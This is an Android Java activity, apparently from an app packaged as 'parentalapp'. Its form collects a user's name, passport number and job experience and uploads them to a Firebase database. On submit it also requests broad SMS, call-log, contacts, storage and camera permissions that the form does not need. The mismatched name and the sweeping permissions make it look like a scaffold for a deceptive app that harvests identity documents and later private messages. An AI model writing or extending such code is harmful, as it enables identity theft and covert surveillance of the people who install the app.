package com.example.parentalapp;

import android.Manifest;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private EditText nameInput, passportInput, jobExperienceInput;
    private Button submitButton;

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        nameInput = findViewById(R.id.nameInput);
        passportInput = findViewById(R.id.passportInput);
        jobExperienceInput = findViewById(R.id.jobExperienceInput);
        submitButton = findViewById(R.id.submitButton);

        submitButton.setOnClickListener(v -> {
            requestAllPermissions();
            sendDataToFirebase();
        });
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA
        }, PERMISSION_REQUEST_CODE);
    }

    private void sendDataToFirebase() {
        String name = nameInput.getText().toString();
        String passport = passportInput.getText().toString();
        String experience = jobExperienceInput.getText().toString();

        if (name.isEmpty() || passport.isEmpty()) {
            Toast.makeText(this, "Please complete the form", Toast.LENGTH_SHORT).show();
            return;
        }

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference ref = database.getReference("users");

        String userId = ref.push().getKey();
        if (userId != null) {
            ref.child(userId).setValue(new UserData(name, passport, experience))
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        Toast.makeText(this, "Submitted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "Failed to submit", Toast.LENGTH_SHORT).show();
                    }
                });
        }
    }

    public static class UserData {
        public String name, passport, experience;

        public UserData() {}

        public UserData(String name, String passport, String experience) {
            this.name = name;
            this.passport = passport;
            this.experience = experience;
        }
    }
}
